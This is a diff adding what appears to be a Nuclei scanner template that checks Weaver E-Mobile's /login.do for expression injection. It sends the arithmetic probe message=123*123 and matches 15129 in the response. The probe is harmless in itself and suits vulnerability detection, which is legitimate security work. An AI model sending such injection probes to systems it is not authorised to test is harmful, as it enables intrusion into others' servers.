@@ -1,0 +1,31 @@
+id: WeaverE-moblie-expressioninject
+
+info:
+  name: 321
+  author: htq
+  severity: high
+
+http:
+  - raw:
+    - |
+      @timeout 30s
+      GET /login.do?message=123*123 HTTP/1.1
+      Host: {{Hostname}}
+      Pragma: no-cache
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 Edg/128.0.0.0
+      Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
+      Cookie: JSESSIONID=abcZ4ciiWc-68fJx1sKhz
+      Cache-Control: no-cache
+      Accept-Encoding: gzip, deflate
+      Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
+
+    redirects: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body  
+        words:
+          - "15129"
+      - type: status
+        status:
+          - 200
